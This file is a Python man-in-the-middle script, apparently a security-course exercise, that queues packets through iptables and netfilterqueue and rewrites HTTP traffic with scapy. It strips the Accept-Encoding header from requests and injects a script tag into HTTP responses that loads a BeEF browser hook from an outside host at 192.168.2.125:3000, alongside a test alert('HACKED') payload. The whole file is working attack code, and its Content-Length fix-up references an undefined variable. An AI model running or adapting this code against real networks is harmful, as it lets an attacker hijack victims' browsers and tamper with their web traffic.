import netfilterqueue
import subprocess
import scapy.all as scapy
import re
from scapy.layers import http

Queue = None
QueueNumb = 0

def init_iptables():
    # Choose 1 for testing with a different machine, and 2 for testing locally
    # 1
    #subprocess.call(['iptables', '-I', 'FORWARD', '-j', 'NFQUEUE', '--queue-num',str(QueueNumb)])

    # 2
    subprocess.call(['iptables', '-I', 'INPUT',  '-j', 'NFQUEUE', '--queue-num', str(QueueNumb)])
    subprocess.call(['iptables', '-I', 'OUTPUT', '-j', 'NFQUEUE', '--queue-num', str(QueueNumb)])

def flush_iptables():
    subprocess.call(['iptables','--flush'])

def set_load(pkt,load):
    pkt[scapy.Raw].load = load

    del pkt[scapy.TCP].chksum
    del pkt[scapy.IP].len
    del pkt[scapy.IP].chksum

    return pkt


def process_pkt(pkt):
    scapy_pkt = scapy.IP(pkt.get_payload())

    if scapy_pkt.haslayer(scapy.Raw) and scapy_pkt.haslayer(scapy.TCP):

        loadvar = scapy_pkt[scapy.Raw].load
        changed = False

        if scapy_pkt[scapy.TCP].dport == 80: # HTTP Request
            print('[+] HTTP Request!')
            # Remove the encoding to make HTML source code human readable
            loadvar = re.sub(b'Accept-Encoding: .*?\\r\\n',b'', loadvar)
            changed =  True
        elif scapy_pkt[scapy.TCP].sport == 80: # HTTP Response
            print('[+] HTTP Response!')
            # Inject basic JS code
            injection_code_test = b'<script>alert("HACKED");</script>'
            # Below is to use beef framework to hook, but I was not able to succed in other machines
            injection_code = b'<script src="http://192.168.2.125:3000/hook.js"></script>'
            loadvar = loadvar.replace(b'</body>',injection_code + b'</body>')

            # Arrange proper length to make attack stronger
            content_length_search = re.search(b'(?:Content-Length:\s)(\d*)', loadvar)
            if content_length_search and b'text/html' in loadvar:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                loadvar = load.replace( content_length, str(new_content_length).encode())

            changed = True

        if changed == True:
            new_pkt = set_load(scapy_pkt, loadvar)
            pkt.set_payload(bytes(new_pkt))

    pkt.accept()

def arrange_queue():
    global Queue, QueueNumb
    Queue = netfilterqueue.NetfilterQueue()
    Queue.bind(QueueNumb,process_pkt)
    Queue.run()


if __name__ == '__main__':
    init_iptables()
    try:
        arrange_queue()
    except KeyboardInterrupt:
        print('[-] CTRL-C detected!')
        flush_iptables()
